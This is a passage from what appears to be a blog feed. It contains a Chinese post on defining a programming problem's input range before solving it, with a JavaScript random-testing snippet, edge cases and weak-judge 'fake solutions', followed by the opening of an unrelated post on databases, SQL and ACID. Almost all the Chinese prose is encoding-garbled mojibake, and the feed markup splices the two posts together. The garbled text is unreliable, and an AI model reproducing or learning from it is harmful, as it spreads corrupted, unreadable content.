è€Œä¸”é‚„æœ‰ä¸€é»å¾ˆé‡è¦ï¼Œåœ¨çœŸæ­£é–‹å§‹è§£é¡Œä»¥å‰ï¼Œä½ è¦å…ˆç†è§£é¡Œç›®ä¸¦ä¸”ç¢ºåˆ‡æŒæ¡é¡Œç›®çš„ç¯„åœã€‚é€™é»å¾ˆå¤šäººéƒ½æœƒå¿½ç•¥ï¼Œç›´æ¥å°±å‹•æ‰‹é–‹å§‹è§£é¡Œäº†ï¼Œé€™åœ¨å¯«ç™½æ¿é¡Œçš„æ™‚å€™ä¹Ÿä¸æ˜¯ä¸€ä»¶å¥½äº‹ã€‚
æ‰€ä»¥é€™ç¯‡æˆ‘å€‘ä¸è«‡è§£é¡Œæœ¬èº«ï¼Œè€Œæ˜¯ä¾†è«‡è«‡åœ¨å‹•æ‰‹è§£é¡Œä»¥å‰æ‡‰è©²å…ˆåšçš„äº‹ã€‚åº•ä¸‹æˆ‘å€‘å…ˆä¾†çœ‹ä¸€å€‹é¡Œç›®ï¼Œä¾†æºæ˜¯ NPSC 2007 å¹´åœ‹ä¸­çµ„åˆè³½ã€‚
é¡Œç›®åç¨±ï¼šä¸å…¬å¹³çš„äººï¼Œæ˜¯èª°ï¼Ÿè‡ªå¾å‘¨æ°å€«å‡ºäº†æ–°å°ˆè¼¯ã€Œç‰›ä»”å¾ˆå¿™ã€å¾Œï¼Œå¤§éƒ­å’Œå°éƒ­å°±æ™‚å¸¸å¹»æƒ³è‡ªå·±æ˜¯ç‰›ä»”ï¼Œçµ‚æ–¼æœ‰ä¸€å¤©ï¼Œå¤§éƒ­æ‰¾ä¾†äº†å…©æŠŠæ°´æ§è¦å’Œå°éƒ­æ±ºé¬¥ã€‚ å¯æ˜¯ç©äº†å¹¾å ´ä»¥å¾Œï¼Œå°éƒ­å…¨èº«éƒ½æº¼é€äº†ï¼Œå¤§éƒ­å»æ˜¯ä¸€èº«ä¹¾çˆ½ï¼Œéš±å¿è¨±ä¹…çš„å°éƒ­çµ‚æ–¼ç™¼é›£äº†ï¼
å°éƒ­ï¼šã€Œæˆ‘éƒ½å™´ä¸åˆ°ä½ â€¦â€¦â€¦ã€
å¤§éƒ­ï¼šã€Œé‚£å¤§æ¦‚æ˜¯ä½ æŠ€è¡“å·®å§ï¼Ÿã€
å°éƒ­ï¼šã€Œé¨™äººï½é¨™äººï½ä½ ä¸€å®šæœ‰ä½œå¼Šå§ï¼Ÿã€
é›–ç„¶å°éƒ­ä»€éº¼éƒ½æ¯”å¤§éƒ­å·®ï¼ˆè«¸å¦‚æ™ºåŠ›ã€é‹å‹•ç¥ç¶“ç­‰â€¦ï¼‰ï¼Œä½†æ˜¯å¦‚æœåœ¨äº‹å‰å¤§éƒ­æº–å‚™çµ¦å°éƒ­çš„æ°´æ§æ¯”è¼ƒå·®çš„è©±ï¼Œé‚£ä»£è¡¨å¤§éƒ­æ˜¯å¾ä¸€é–‹å§‹å°±æœ‰å¿ƒæŠŠé€™å ´éŠæˆ²ç­–ç•«æˆä¸å…¬å¹³çš„å£äººã€‚
å‰›å¥½è·¯éçš„ä½ ï¼Œè¢«åµåµé¬§é¬§çš„å…©äººæŠ“å»ç•¶è£åˆ¤ã€‚
è¼¸å…¥èªªæ˜è¼¸å…¥æœƒæ˜¯å…©å€‹å­—ä¸² M èˆ‡ Nã€‚å…¶ä¸­Mä»£è¡¨å¤§éƒ­çš„æ°´æ§å°„ç¨‹ï¼ŒNä»£è¡¨å°éƒ­çš„æ°´æ§å°„ç¨‹ï¼Œæ³¨æ„ç‚ºæ±‚ç²¾ç¢ºï¼Œæ‰€æœ‰å°„ç¨‹çš„é•·åº¦å–®ä½å‡ç‚ºå¥ˆç±³ã€‚å› ç‚ºå¤§éƒ­å¼„ä¾†çš„æ°´æ§æ˜¯22ä¸–ç´€çš„ç”¢ç‰©ï¼Œæ•…æ°´æ§çš„å°„ç¨‹éå¸¸éå¸¸é ï¼Œæœ€é•·å¯ä»¥åˆ°é”400ä½æ•¸çš„æ•¸å­—ï¼ˆå°„ç¨‹å¿…ç‚ºä¸€éè² æ•´æ•¸ï¼‰ã€‚
è¼¸å‡ºèªªæ˜å°æ¯ä¸€çµ„æ¸¬è©¦è³‡æ–™ï¼Œä½ æ‡‰è©²å›å‚³ä¸€å€‹å­—ä¸²ï¼Œè©²åˆ—å¾å°éƒ­çš„è§’åº¦å‡ºç™¼ï¼ˆå°éƒ­é›–ç„¶æ¯”è¼ƒç¬¨ï¼Œä½†é‚„æ˜¯å¾ˆå¥¸è©çš„ï¼ï¼‰ï¼Œåˆ¤æ–·é€™æ˜¯ä¸æ˜¯ä¸€å ´å…¬å¹³çš„æ¯”è³½ï¼ˆå°æ–¼å°éƒ­ä¾†èªªï¼Œåªè¦å¤§éƒ­çš„å°„ç¨‹ä¸æ¯”å°éƒ­å¤§ï¼Œå°±æ˜¯ä¸€å ´å…¬å¹³çš„éŠæˆ²ï¼‰ã€‚è‹¥æ˜¯å°å°éƒ­æœ‰åˆ©çš„éŠæˆ²ï¼Œå‰‡å›å‚³ã€ŒFairã€ï¼Œè‹¥ä¸æ˜¯ï¼Œå‰‡å›å‚³ã€ŒUnfairã€
ç¯„ä¾‹è¼¸å…¥123 456
ç¯„ä¾‹è¼¸å‡ºFair

ä»¥ä¸Šå°±æ˜¯ä¸€å€‹å®Œæ•´çš„é¡Œç›®ï¼ŒæœƒåŒ…å«é¡Œç›®ä»‹ç´¹ã€è¼¸å…¥èªªæ˜ã€è¼¸å‡ºèªªæ˜ä»¥åŠç¯„ä¾‹ã€‚ä½ å¯èƒ½æœƒè¦ºå¾—å°±æ˜¯ä¸€å€‹æ•¸å­—æ¯”å¤§å°çš„å•é¡Œè€Œå·²ï¼Œä½†å…¶å¯¦æ²’æœ‰é‚£éº¼ç°¡å–®ã€‚
æ¥è‘—æˆ‘å€‘å°±ä¾†çœ‹çœ‹æ‡‰è©²è¦æ³¨æ„å“ªäº›æ±è¥¿ã€‚
1. é¡Œç›®çš„ç¯„åœç‚ºä»€éº¼é€™ç¨®ç¨‹å¼è§£é¡Œçš„é¡Œç›®ä¸€å®šè¦çµ¦ç¯„åœï¼Ÿè¦å›ç­”é€™å€‹å•é¡Œå¾ˆç°¡å–®ï¼Œæˆ‘å€‘å…ˆä¾†çœ‹çœ‹å¦‚æœä¸çµ¦ç¯„åœæœƒæ€æ¨£ï¼Œä¾‹å¦‚èªªï¼š

è«‹å¯«å‡ºä¸€å€‹åˆ¤æ–·è³ªæ•¸çš„ function

ä½ å¯èƒ½çœ‹åˆ°ä»¥å¾Œå°±æ‰¹å“©å•ªå•¦å¯«å®Œç„¶å¾Œå°±äº¤å·äº†ã€‚å¯æ˜¯å› ç‚ºé€™å€‹é¡Œç›®éå¸¸ä¸æ˜ç¢ºï¼Œæ‰€ä»¥ä½ å…¶å¯¦æ²’æœ‰è¾¦æ³•ç¢ºèªè‡ªå·±çš„ç­”æ¡ˆæ˜¯ä¸æ˜¯å°çš„ï¼Œä¾‹å¦‚èªªï¼š

æ˜¯å›å‚³ true æˆ– false å—ï¼Ÿé‚„æ˜¯å›å‚³å­—ä¸² YES è·Ÿ NOï¼Ÿ
å¦‚æœè¼¸å…¥æ˜¯å­—ä¸²æ€éº¼è¾¦ï¼Ÿæˆ‘éœ€è¦åšè™•ç†å—ï¼Ÿ
å¦‚æœæ˜¯å°æ•¸æˆ–è² æ•¸å‘¢ï¼Ÿéœ€è¦åšç‰¹åˆ¥è™•ç†å—ï¼Ÿ
å¦‚æœæ•¸å­—è¶…é integer çš„ç¯„åœæœƒç™¼ç”Ÿä»€éº¼äº‹ï¼Ÿ

è‹¥æ˜¯æ²’æœ‰æ˜ç¢ºåœ°å®šç¾©è¼¸å…¥ä»¥åŠè¼¸å‡ºï¼Œå…¶å¯¦ä½ æ ¹æœ¬å¯«ä¸å‡ºã€Œæ­£ç¢ºã€çš„ç¨‹å¼ï¼Œå› ç‚ºä¹Ÿæ²’æœ‰ã€Œæ­£ç¢ºã€é€™ç¨®äº‹ï¼Œæ‰€ä»¥å®šç¾©è¼¸å…¥ç¯„åœçš„ç¬¬ä¸€å€‹ç›®çš„å°±æ˜¯å¹«ä½ æ›´æ˜ç¢ºåœ°å»é‡æ¸…é¡Œç›®ã€‚
ä¾‹å¦‚èªªä¸€å€‹æ¯”è¼ƒå¥½çš„é¡Œç›®æœƒé•·é€™æ¨£ï¼š

è«‹å¯«å‡ºä¸€å€‹å‡½å¼ï¼Œçµ¦å®šä¸€å€‹æ­£æ•´æ•¸ nï¼ˆ1&lt;&#x3D;n&lt;&#x3D;100000ï¼‰ï¼Œè«‹å›å‚³ n æ˜¯å¦ç‚ºè³ªæ•¸ï¼Œæ˜¯çš„è©±å›å‚³ trueï¼Œåä¹‹å›å‚³ false

ç•¶é¡Œç›®èªªã€Œçµ¦å®šä¸€å€‹æ­£æ•´æ•¸ nï¼ˆ1&lt;&#x3D;n&lt;&#x3D;100000ï¼‰ã€çš„æ™‚å€™ï¼Œä»£è¡¨ä½ å¯ä»¥å®Œå…¨ä¸ç®¡è¶…å‡ºé€™ç¯„åœçš„æƒ…å½¢ã€‚n çµ•å°ä¸æœƒæ˜¯å­—ä¸²ï¼Œä¹Ÿä¸æœƒæ˜¯é™£åˆ—ï¼Œä¹Ÿä¸æœƒæ˜¯ 0ï¼Œä¸æœƒæ˜¯å°æ•¸æˆ–è² æ•¸ï¼Œæ‰€ä»¥ä¸éœ€è¦å»ç†æœƒé€™äº› caseã€‚
é †å¸¶ä¸€æï¼Œé€™æ˜¯å¾ˆå¤šäººåœ¨é¢è©¦ç™½æ¿é¡Œçš„æ™‚å€™æœƒçŠ¯çš„éŒ¯èª¤ï¼Œæ²’æœ‰æŠŠé¡Œç›®ç¯„åœå•æ¸…æ¥šå°±é–‹å§‹å¯¦ä½œäº†ã€‚
ç™½æ¿é¡Œæ˜¯å¯ä»¥è·Ÿé¢è©¦å®˜è¨è«–çš„ï¼Œé€™æ™‚å€™ä½ å°±æ‡‰è©²æŠŠé¡Œç›®ç¯„åœå•æ¸…æ¥šï¼Œæ‰é–‹å§‹å‹•æ‰‹è§£é¡Œï¼Œè€Œä¸”é¡Œç›®ç¯„åœå…¶å¯¦ä¹Ÿæœƒå½±éŸ¿åˆ°ä½ çš„è§£æ³•ã€‚
èˆ‰é–‹é ­çš„é¡Œç›®ä¾†èªªï¼š

å› ç‚ºå¤§éƒ­å¼„ä¾†çš„æ°´æ§æ˜¯22ä¸–ç´€çš„ç”¢ç‰©ï¼Œæ•…æ°´æ§çš„å°„ç¨‹éå¸¸éå¸¸é ï¼Œæœ€é•·å¯ä»¥åˆ°é”400ä½æ•¸çš„æ•¸å­—ï¼ˆå°„ç¨‹å¿…ç‚ºä¸€éè² æ•´æ•¸ï¼‰

ä»¥ JavaScript ç‚ºä¾‹ï¼Œæœ‰äº›äººæœƒå¾ˆå¤©çœŸçš„ä»¥ç‚ºé€™ä¸€é¡Œæ˜¯åœ¨è€ƒä½ å…©å€‹ã€Œæ•¸å­—ã€æ¯”å¤§å°ã€‚400 ä½æ•¸çš„æ•¸å­—ï¼ŒJavaScript å­˜å¾—ä¸‹å—ï¼Ÿå­˜ä¸ä¸‹ã€‚
å¯ä»¥ç”¨Number.MAX_SAFE_INTEGERä¾†å–åˆ° Number å‹æ…‹èƒ½å­˜çš„æœ€å¤§æ•¸å­—ï¼Œé€£ 20 ä½éƒ½ä¸åˆ°ï¼Œä½•æ³æ˜¯ 400 ä½ã€‚
å¦‚æœé¡Œç›®è·Ÿä½ èªªæ•¸å­—æ˜¯ 10 ä½æ•¸ä»¥å…§ï¼Œå°±å¯ä»¥ç›´æ¥æŠŠå­—ä¸²è½‰æˆæ•¸å­—æ¯”å¤§å°ç„¶å¾Œå›å‚³çµæœã€‚ä½†ä»Šå¤©æ•¸å­—æ˜¯ 400 ä½æ•¸ï¼Œå°±æ²’è¾¦æ³•ç”¨ Number é€™å€‹å‹æ…‹ã€‚æ‰€ä»¥è¦å˜›å°±æ˜¯ç›´æ¥æ‹¿å­—ä¸²ä¾†æ¯”å¤§å°ï¼Œè¦å˜›å°±æ˜¯ç”¨æ¯”è¼ƒæ½®çš„ BigInt ä¾†è§£ã€‚
è‹¥æ˜¯é¡Œç›®æ²’æœ‰çµ¦ç¯„åœï¼Œå°±æ²’è¾¦æ³•æ±ºå®šè¦æ¡å–æ€æ¨£çš„åšæ³•ã€‚æ‰€ä»¥ç¯„åœçš„ç›®çš„å°±æ˜¯æŠŠé¡Œç›®å®šç¾©åœ°æ›´æ˜ç¢ºï¼Œç•«ä¸€æ¢ç·šåœ¨é‚£é‚Šï¼Œè·Ÿä½ èªªï¼šã€Œæ¬¸æ¬¸ï¼Œé¡Œç›®ç¯„åœåˆ°é€™é‚Šå–”ï¼Œè¶…å‡ºç•Œç·šçš„å¯ä»¥ä¸ç”¨è€ƒæ…®ã€
2. å¯«å®Œä¹‹å¾Œçš„æ¸¬è©¦å¦‚æœæ˜¯ä¸€äº› Online Judgeï¼ˆä»¥ä¸‹ç°¡ç¨± OJï¼‰ç³»çµ±ï¼Œå¹³æ™‚çš„è§£é¡Œå¯ä»¥ä¸€ç›´è©¦éŒ¯ï¼Œéš¨æ„å¯«å®Œä¹‹å¾Œå°±ä¸Ÿä¸Šå»ï¼Œæœ‰éŒ¯çš„è©±å†ä¾† debug æ‰¾éŒ¯èª¤ï¼Œæ²’éŒ¯çš„è©±å°±è§£ä¸‹ä¸€é¡Œã€‚
ä½†æ˜¯æ¯”è³½æˆ–æ˜¯æœ‰äº›é¢è©¦çš„è©±å°±ä¸ä¸€æ¨£äº†ï¼Œä½ åªæœ‰ä¸€æ¬¡æ©Ÿæœƒï¼Œæˆ–æ˜¯ç­”éŒ¯äº†æœƒæœ‰ penalty ä¹‹é¡çš„ï¼Œæ‰€ä»¥è¦åœ¨é€å‡ºç­”æ¡ˆä¹‹å‰è‡ªå·±å…ˆæª¢æŸ¥å€‹å¹¾éï¼Œç¢ºèªæ²’ä»€éº¼å•é¡Œæ‰é€å‡ºã€‚
é€™æ™‚å€™æ¸¬è©¦å°±å¾ˆé‡è¦ï¼ŒåŸºæœ¬ä¸Šæœ‰å¹¾å€‹æ–¹æ³•å¯ä»¥æ¸¬è©¦ä½ å¯«å‡ºä¾†çš„ç¨‹å¼æ˜¯å¦æ­£ç¢ºï¼Œä¾‹å¦‚èªªç¬¬ä¸€å€‹ï¼Œä¹Ÿæ˜¯æœ€ç°¡å–®çš„ä¸€å€‹ï¼šå…ˆæ‹¿é¡Œç›®çµ¦çš„ç¯„ä¾‹æ¸¬è³‡ï¼ˆæ¸¬è©¦è³‡æ–™çš„ç°¡ç¨±ï¼‰æ¸¬ï¼Œå¦‚æœç¯„ä¾‹éä¸äº†é‚£ä¸€å®šæ˜¯å¯«éŒ¯äº†ã€‚
ç¬¬äºŒï¼Œå¦‚æœå¯ä»¥çš„è©±ï¼Œå¯«ä¸€å€‹ç¨‹å¼ä¾†æ¸¬ã€‚é€™æœ‰äº›é¡Œç›®åšå¾—åˆ°æœ‰äº›åšä¸åˆ°ï¼Œä¾‹å¦‚èªªåˆ¤æ–·è³ªæ•¸å¯èƒ½å°±åšä¸åˆ°ï¼Œé™¤éä½ å»æ‰¾åˆ¥äººå¯«å¥½çš„åˆ¤æ–·è³ªæ•¸çš„ code ä¾†ç”¨ã€‚ä½†å¦‚æœæ˜¯ä¸Šé¢æ•¸å­—æ¯”å¤§å°çš„é€™ä¸€é¡Œï¼Œé‡å°å°ç¯„åœï¼ˆæ•¸å­—ä½æ•¸ä½æ–¼ 10 ä½æ•¸ä»¥ä¸‹ï¼‰çš„æƒ…å½¢å°±å¯ä»¥å¯«ç¨‹å¼ä¾†æ¸¬ï¼š
// çµ•å°æ˜¯å°çš„çš„æ•¸å­—æ¯”è¼ƒfunction compare(a, b) &#123; return b &gt;= a ? &#x27;Fair&#x27; : &#x27;Unfair&#x27; &#125;  // è·‘ä¸€è¬éfor(let i = 1; i &lt;=10000; i++) &#123;  // éš¨æ©Ÿç”¢ç”Ÿè³‡æ–™  const a = Math.floor(Math.random() * 1e9)  const b = Math.floor(Math.random() * 1e9)  // åˆ¤æ–·ä¸€èˆ¬æ•¸å­—æ¯”å¤§å°ä»¥åŠå­—ä¸²æ¯”å¤§å°çš„çµæœ  // è¨˜å¾—é€™é‚Šè¦è½‰æˆå­—ä¸²ä¾†æ¯”å°  if (compare(a, b)!== stringCompare(a + &#x27;&#x27;, b + &#x27;&#x27;)) &#123;    // å‡ºéŒ¯ï¼Œå°å‡ºä¾†å“ªç­†è³‡æ–™éŒ¯èª¤    console.log(&#x27;error&#x27;, a, b)  &#125;&#125;

è·‘å€‹åæ¬¡ä½ å°±æ¸¬åè¬ç­†è³‡æ–™äº†ï¼Œå°±èƒ½ä¿è­‰ä¸€äº›æ­£ç¢ºæ€§ã€‚é™¤äº†é€™æ¨£ä»¥å¤–ï¼Œé‚„æœ‰ä¸€é»å¾ˆé‡è¦ï¼šè‡ªå·±ç”Ÿæ¸¬è³‡ï¼Œè€Œä¸”è¦ç”¢ç”Ÿé‚£ç¨®é‚Šç•Œæ¢ä»¶çš„æ¸¬è³‡ã€‚
3. é‚Šç•Œæ¢ä»¶é‚Šç•Œæ¢ä»¶é€šå¸¸ä¹Ÿè¢«ç¨±ç‚º boundary caseã€corner caseã€edge case ç­‰ç­‰ï¼ˆæœ€ç²¾ç¢ºçš„å®šç¾©å¥½åƒä¸å¤ªç›¸åŒï¼Œä½†æ¦‚å¿µä¸Šæ‡‰è©²å·®ä¸å¤šï¼‰ï¼Œä¸€è¨€ä»¥è”½ä¹‹ï¼Œå°±æ˜¯å¾ˆå®¹æ˜“è®“ä½ ç¨‹å¼å‡ºå•é¡Œçš„æ¸¬è³‡ï¼Œè¦æ¸¬ä½ çš„ç¨‹å¼åœ¨æ¥µç«¯çš„æƒ…å½¢ä¹‹ä¸‹æœƒä¸æœƒå£æ‰ã€‚
ä»¥ä¸Šé¢æ¯”å¤§å°çš„é¡Œç›®ç‚ºä¾‹ï¼Œå¯èƒ½å°±æ˜¯ 0 0ã€0 10 é€™ç¨®æ¯”è¼ƒå°‘æœƒè€ƒæ…®åˆ°çš„æ¢ä»¶ã€‚æˆ–è€…æ˜¯ä»¥å¤§æ•¸åŠ æ³•ï¼ˆå…©å€‹å­—ä¸²ç•¶ä½œæ•¸å­—ç›¸åŠ ï¼Œä¾‹å¦‚èªª&#39;123&#39;+&#39;123&#39; =&gt; &#39;456&#39;ï¼‰ç‚ºä¾‹ï¼Œå°±æœƒæ˜¯ï¼š

0 + 0ï¼Œå…©å€‹é›¶ç›¸åŠ 
0 + 9999ï¼ŒåŠ å®Œæ²’æœ‰æ”¹è®Š
1 + 9999ï¼ŒåŠ å®Œæœƒé€²ä½

æœ€å¾Œå†èˆ‰ä¸€å€‹åˆ¤æ–·è¿´æ–‡çš„ä¾‹å­ï¼Œå¯èƒ½å°±æœƒæ˜¯ï¼š

ç©ºå­—ä¸²
åªæœ‰ä¸€å€‹å­—çš„å­—ä¸²

é€™äº› edge case æ˜¯å¾ˆå®¹æ˜“æœƒæ¬ ç¼ºè€ƒæ…®è€Œå‡ºéŒ¯çš„åœ°æ–¹ï¼Œæ‰€ä»¥åœ¨ç”¢ç”Ÿæ¸¬è³‡çš„æ™‚å€™ï¼Œæœ€å¥½æ˜¯è‡ªå·±ä¹Ÿè¦æƒ³ä¸€ä¸‹æœ‰å“ªäº› edge case æ˜¯æ²’æœ‰è€ƒæ…®åˆ°çš„ã€‚å¾ˆå¤šæ™‚å€™ä½ æ²’æœ‰æ‹¿æ»¿åˆ†ï¼Œå°±æ˜¯å› ç‚ºé€™äº› edge case æ²’æœ‰è€ƒæ…®åˆ°ã€‚
å¯æ˜¯å°±ç®—æ»¿åˆ†ï¼Œå°±ä»£è¡¨çœŸçš„å°äº†å—ï¼Ÿ
4. å‡è§£çš„å¯èƒ½æ€§ä¸€èˆ¬ä¾†èªªæˆ‘å€‘ç¨±é‚£äº›é€šé OJ ä½†å…¶å¯¦ä¸æ˜¯æ­£ç¢ºçš„è§£ç­”ç‚ºã€Œå‡è§£ã€ï¼Œé€šå¸¸æœƒç™¼ç”Ÿéƒ½æ˜¯å› ç‚º OJ ä¸Šçš„æ¸¬è³‡å¤ªå¼±ï¼Œæ‰€ä»¥æ‰è®“å‡è§£è’™æ··éé—œã€‚
åƒæ˜¯ä¸Šé¢æ¯”å¤§å°é€™é¡Œï¼Œé›–ç„¶é¡Œç›®å¯«èªª M èˆ‡ N æœ€å¤šå¯ä»¥åˆ° 400 ä½æ•¸ï¼Œä½†æœ‰å¯èƒ½æ¸¬è³‡å·æ‡¶ï¼Œæœ€å¤§åªåˆ°äº”ä½æ•¸è€Œå·²ã€‚åœ¨é€™ç¨®æƒ…å½¢åº•ä¸‹ï¼Œä½ å¯«ä¸€å€‹æŠŠå­—ä¸²è½‰æ›ç‚ºæ•¸å­—ç„¶å¾Œæ¯”å¤§å°çš„è§£æ³•å°±å¯ä»¥éé—œï¼Œä½†æˆ‘å€‘ä¸æœƒèªªé€™æ˜¯æ­£è§£ï¼Œå› ç‚ºå¤šåŠ ä¸€ç­†æ¸¬è³‡ç­”æ¡ˆå°±éŒ¯äº†ã€‚
æˆ–è€…æ˜¯æœ‰äº›é¡Œç›®æ²’æœ‰å¡æ™‚é–“è¤‡é›œåº¦ï¼ŒåŸæœ¬é æœŸè¦ O(n) çš„è§£æ³•ï¼Œçµæœç”¨ O(n^2) ä¹Ÿå¯ä»¥éã€‚æœ‰äº›å‡è§£å¯«äº†ä½ æœƒè‡ªå·±çŸ¥é“æ˜¯å‡è§£ï¼Œä½†æœ‰äº›ä½ ä¸æœƒç™¼è¦ºã€‚é€™éƒ¨åˆ†å…¶å¯¦è¦é  OJ ä¾†æŠŠé—œï¼Œæ¸¬è³‡å¿…é ˆç”¨å¿ƒç”¢ç”Ÿï¼Œæ‰èƒ½é¿å…é€™ç¨®å‡è§£çš„ç‹€æ³ã€‚
çµè«–ä¸Šé¢çš„é¡Œç›®å¦‚æœæƒ³ç·´ç¿’çš„è©±ï¼Œæˆ‘ä¹‹å‰æœ‰å¯«äº†ä¸€å€‹éå¸¸éå¸¸é™½æ˜¥è€Œä¸”ç ´çˆ›çš„å°ˆé–€çµ¦ JavaScript çš„ OJ ç³»çµ±ï¼šLidemy OJï¼Œåœ¨é–‹å§‹è§£é¡Œä¹‹å‰è«‹å…ˆåˆ°é¦–é é–±è®€æ³¨æ„äº‹é …ï¼ˆä¾‹å¦‚èªªè«‹å‹¿ä½¿ç”¨ç®­é ­å‡½å¼ä¹‹é¡çš„ã€‚
å¯«é€™ç¯‡çš„åŸå› æ˜¯å¸Œæœ›å‰›æ¥è§¸ç¨‹å¼è§£é¡Œçš„æ–°æ‰‹å€‘å¯ä»¥ç†è§£åœ¨å‹•æ‰‹è§£é¡Œä¹‹å‰ï¼Œå…¶å¯¦æœ‰æ›´å¤šé‡è¦çš„äº‹éœ€è¦å»é—œæ³¨ã€‚è¨˜å¾—å…ˆæŠŠé¡Œç›®å®šç¾©æ¸…æ¥šï¼Œæ‰å»å‹•æ‰‹è§£é¡Œï¼Œé€™å€‹åœ¨é¢è©¦è€ƒç™½æ¿é¡Œçš„æ™‚å€™ä¹Ÿæ˜¯å¿…å‚™æŠ€èƒ½ä¹‹ä¸€ã€‚
å¦‚æœå¯«é¡Œç›®çš„æ™‚å€™ç™¼ç¾é¡Œç›®æ²’æœ‰å®šç¾©æ¸…æ¥šï¼Œé‚£é€™å€‹é¡Œç›®æˆ–è¨±å°±ä¸æ˜¯é€™éº¼å¥½ï¼Œå¯ä»¥è·Ÿç¶²ç«™åæ˜ ä¸€ä¸‹ï¼Œè®“ä»–å€‘è£œä¸Šé¡Œç›®ç¯„åœã€‚
ç¥å¤§å®¶éƒ½èƒ½åœ¨ç¨‹å¼è§£é¡Œçš„è·¯ä¸Šæ‰¾åˆ°æ¨‚è¶£ã€‚
é—œæ–¼ä½œè€…ï¼š@huli é‡ç”Ÿå·¥ç¨‹å¸«ï¼Œç›¸ä¿¡åˆ†äº«èˆ‡äº¤æµèƒ½è®“ä¸–ç•Œè®Šå¾—æ›´ç¾å¥½
]]></content>
      <tags>
        <tag>JavaScript</tag>
        <tag>Algorithm</tag>
      </tags>
  </entry>
  <entry>
    <title>å¾Œç«¯è»Ÿé«”å·¥ç¨‹å·¥å…·ç®±ï¼šè³‡æ–™åº«/SQL/ORMç¯‡</title>
    <url>/2017/05/06/back-end-engineer-toolbox-database-sql-orm/</url>
    <content><![CDATA[å‰è¨€äº‹å¯¦ä¸Šï¼Œè¦æˆç‚ºä¸€å€‹å¥½çš„å¾Œç«¯è»Ÿé«”å·¥ç¨‹å¸«é™¤äº†å¿…é ˆå°æ–¼å¾Œç«¯å·¥ç¨‹çš„ç¨‹å¼èªè¨€çš„éƒ¨ä»½æœ‰æ‰€äº†è§£å¤–ï¼Œä¹Ÿéœ€è¦äº†è§£ç³»çµ±è¨­è¨ˆçš„åŸç†å’Œä¼ºæœå™¨è¦åŠƒï¼ˆServer è¦åŠƒã€Load Balanceã€Memory Cacheã€DB Scalingã€Cloud Serverã€å¾Œç«¯æ¡†æ¶ã€TCP&#x2F;IP&#x2F;UDP ç¶²è·¯é€šè¨Šå”å®šã€HTTP è¶…æ–‡å­—å‚³è¼¸å”å®šã€è¨­è¨ˆæ¨¡å¼ã€è³‡æ–™åº«æ“ä½œã€SQL&#x2F;ORMã€è³‡è¨Šå®‰å…¨ã€æ€§èƒ½å„ªåŒ–ç­‰ï¼‰ã€‚æ¥ä¸‹ä¾†æˆ‘å€‘å°‡ä¾†æ¢è¨è³‡æ–™åº«&#x2F;SQL&#x2F;ORM ç›¸é—œè­°é¡Œã€‚
è³‡æ–™åº«åŸºç¤æ¦‚å¿µä¸€èˆ¬æŒä¹…æ€§å„²å­˜è³‡æ–™æ˜¯è³‡è¨Šç³»çµ±æˆ–æ˜¯æ‡‰ç”¨ç¨‹å¼è »é‡è¦çš„ä¸€å€‹ç’°ç¯€ï¼Œé™¤äº†ä½¿ç”¨æª”æ¡ˆç³»çµ±å¤–ä½¿ç”¨è³‡æ–™åº«ä¹Ÿæ˜¯å¦å¤–ä¸€å€‹éå¸¸é‡è¦çš„å„²å­˜å·¥å…·ã€‚æ¯”èµ·æª”æ¡ˆç³»çµ±ï¼Œè³‡æ–™åº«é›–ç„¶ç›¸å°è¤‡é›œï¼ˆä¸€èˆ¬ä¾†èªªéœ€è¦æ­£è¦åŒ–ï¼‰ä½†åœ¨è³‡æ–™æŸ¥è©¢ä½¿ç”¨å’Œç®¡ç†ä¸Šæ¯”èµ·æª”æ¡ˆæœƒæ–¹ä¾¿è¨±å¤šã€‚
åœ¨è³‡æ–™åº«ç³»çµ±ä¸­ï¼Œæˆ‘å€‘æœƒç¨±è³‡æ–™åº«æ“ä½œçš„ä¸€å€‹å®Œæ•´çš„é‚è¼¯éç¨‹ç‚ºäº‹å‹™ï¼ˆtransactionï¼‰ã€‚ä¾‹å¦‚ï¼šéŠ€è¡Œ ATM è½‰å¸³ï¼Œå¾åŸå¸³æˆ¶æ‰£é™¤é‡‘é¡ï¼Œä»¥åŠå‘ç›®æ¨™å¸³æˆ¶æ–°å¢é‡‘é¡ï¼Œé€™å…©å€‹è³‡æ–™åº«æ“ä½œçš„ç¸½å’Œï¼Œå°±æœƒæ§‹æˆä¸€å€‹å®Œæ•´çš„é‚è¼¯éç¨‹ï¼Œä¸å¯æ‹†åˆ†ã€‚é€™å€‹éç¨‹è¢«ç¨±ç‚ºä¸€å€‹äº‹å‹™ï¼Œå…·æœ‰ ACID ç‰¹æ€§ã€‚

ä»€éº¼æ˜¯ ACIDï¼Ÿ ACID ä¿‚æŒ‡è³‡æ–™åº«ç®¡ç†ç³»çµ±ï¼ˆDBMSï¼‰åœ¨å¯«å…¥&#x2F;æ›´æ–°è³‡æ–™çš„éç¨‹ä¸­ï¼Œç‚ºä¿è­‰äº‹å‹™ï¼ˆtransactionï¼‰æ˜¯æ­£ç¢ºå¯é çš„ï¼Œæ‰€å¿…é ˆå…·å‚™çš„å››å€‹ç‰¹æ€§ï¼šåŸå­æ€§ï¼ˆatomicityï¼Œæˆ–ç¨±ä¸å¯åˆ†å‰²æ€§ï¼‰ã€ä¸€è‡´æ€§ï¼ˆconsistencyï¼‰ã€éš”é›¢æ€§ï¼ˆisolationï¼Œåˆç¨±ç¨ç«‹æ€§ï¼‰ã€æŒä¹…æ€§ï¼ˆdurabilityï¼‰

åŸå­æ€§ï¼šä¸€å€‹äº‹å‹™ï¼ˆtransactionï¼‰ä¸­çš„æ‰€æœ‰æ“ä½œï¼Œè¦éº¼å…¨éƒ¨å®Œæˆï¼Œè¦éº¼å…¨éƒ¨ä¸å®Œæˆï¼Œä¸æœƒçµæŸåœ¨ä¸­é–“æŸå€‹ç’°ç¯€ã€‚äº‹å‹™åœ¨åŸ·è¡Œéç¨‹ä¸­ç™¼ç”ŸéŒ¯èª¤ï¼Œæœƒè¢«å›æ»¾ï¼ˆrollbackï¼‰åˆ°äº‹å‹™é–‹å§‹å‰çš„ç‹€æ…‹ï¼Œå°±åƒé€™å€‹äº‹å‹™å¾ä¾†æ²’æœ‰åŸ·è¡Œéä¸€æ¨£

